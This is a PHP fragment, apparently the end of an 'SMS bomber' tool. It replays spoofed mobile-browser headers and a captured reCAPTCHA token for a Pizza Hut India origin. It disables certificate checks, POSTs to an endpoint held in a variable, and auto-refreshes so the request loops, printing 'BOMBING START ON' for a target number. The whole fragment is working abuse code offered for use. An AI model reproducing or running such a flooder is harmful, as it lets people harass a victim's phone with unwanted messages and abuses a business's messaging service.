$headers1221 = array("content-length: 25","x-trace-id: 3340b5b4-a156-4a93-9018-b923dade55b6","x-environment-flag: production","save-data: on","user-agent: Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36","recaptcha-token: 03AGdBq24V2IX6NDnL0hjX0tShl3_4g4SZv247dXBf1fdLata8RG8YXvXQt8FodKytcgDwGsi9BXa-EuhD3kCb5DVO2K-TvNHZuDUSkABjRn5eAcfYt779mHZXs3Ob5LtZYFiApkpvTTlQ9ir_4d-_O4kQdPDpHAq1oLhfey6WAPsc0DfkhFZFLcKYfDIcAqE4_a_W_b-QeJOip6Ew5Q1J4XfuuhJmEH2BpToQUR2b2JfSlRlts1p-jxFUZOMOESZTgNsHt2i_F_8zgS0-RkdQEYILtZWaEixVXt6Jg-iMclNICoAoRIfNfPOpeHZ2qdp4wcUVJcX2VQ3QBMHrN7dLeEJ61o8np5WqYQ0mrXKnKGm4rheQ9qpWvdQ5eahyEFx1dlylU-AvUU_h_VlRSBfavug3vMZtZlg9pd55dQQrtgvaGKT-dmdX_Nb3BUP_GzhRih-E1NfE8QQ78ceobg82U5XqD8XdIPKAeQ","content-type: application/json; charset=utf-8","accept: */*","origin: https://www.pizzahut.co.in","sec-fetch-site: cross-site","sec-fetch-mode: cors","sec-fetch-dest: empty","accept-encoding: gzip, deflate, br","accept-language: en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7");


$ch14=curl_init();
curl_setopt($ch14, CURLOPT_URL,$url1221);
curl_setopt($ch14, CURLOPT_HEADER,0);
curl_setopt($ch14, CURLOPT_HTTPHEADER,$headers1221);
curl_setopt($ch14, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch14, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch14, CURLOPT_POST, 1);
curl_setopt($ch14, CURLOPT_POSTFIELDS,$data1221);
curl_setopt($ch14, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch14, CURLOPT_FOLLOWLOCATION,0);
$one14=curl_exec($ch14);


echo'<meta http-equiv="refresh" content=0>';

echo"<div class='error'> 
We are Not Responsible For any Damage to Your Phone <hr>
BOMBING START ON => $mo";




}






}
?>
